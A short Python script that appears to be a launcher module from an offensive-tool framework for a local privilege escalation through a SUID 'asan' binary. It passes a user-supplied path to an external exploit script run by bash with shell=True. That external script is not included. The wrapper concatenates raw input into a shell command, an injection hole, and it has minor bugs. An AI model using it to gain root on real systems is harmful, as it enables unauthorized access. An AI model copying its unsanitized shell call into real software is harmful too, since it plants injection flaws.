import subprocess


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


option = \
    """
VARIABLE                 DESCRIPTION              NEEDED
---------                -----------              ------
path_to_bin              full path to binary      yes

(example)
    set path_to_bin /bin/asan
    run / exploit
"""


def main():
    call = "asan-suid-lpe.sh"
    while True:
        module = input(f"{Colors.red}(Asan SUID Local Privilege Escalation){Colors.end} [MODULE]:~#")
        if module == "help" or module == "options":
            print(f"path_to_bin: {Colors.red}", option, Colors.end)
        elif module == "exit" or module == "back":
            break
        if "set path_to_bin " in module:
            path = module[16:]
            print(path)
        if module == "run" or module == "exploit":
            subprocess.call("bash -i " + call + " " + path, shell=True)
            break


main()
